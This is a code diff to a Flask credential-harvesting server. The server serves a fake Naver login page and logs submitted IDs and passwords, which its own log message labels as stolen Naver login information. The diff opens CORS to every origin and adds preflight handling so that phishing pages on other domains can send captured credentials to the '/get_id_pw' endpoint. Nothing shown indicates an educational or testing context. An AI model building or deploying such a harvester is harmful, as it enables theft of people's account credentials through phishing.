@@ -11,7 +11,7 @@ from logging.handlers import RotatingFileHandler
 app = Flask(__name__)
 
 # cors 설정
-CORS(app, resources={r"*": {"origins": "http://www.naver.com"}})
+CORS(app)
 
 
 # LOG_FORMATTER = logging.Formatter(
@@ -39,16 +39,18 @@ def login_page():
     return send_from_directory(CURRENT_DIR, "naver_login.html")
 
 
-@app.route("/get_id_pw", methods=["POST"])
+@app.route("/get_id_pw", methods=["OPTIONS", "POST"])
 def get_id_pw():
-    req_json = request.get_json()
+    response = jsonify({"status": "ok"})
+    if request.method == "POST":
+        req_json = request.get_json()
 
-    id = req_json["id"]
-    pw = req_json["pw"]
+        id = req_json["id"]
+        pw = req_json["pw"]
 
-    logger.info(f"[탈취한 네이버 로그인 정보] id: {id} / pw: {pw}")
+        logger.info(f"[탈취한 네이버 로그인 정보] id: {id} / pw: {pw}")
 
-    response = jsonify({"some": "data"})
-    response.headers.add("Access-Control-Allow-Origin", "*")
-    response.headers.add("Access-Control-Allow-Credentials", True)
+        return response
+    elif request.method == "OPTIONS":
+        response.headers.add("Access-Control-Allow-Credentials", True)
     return response
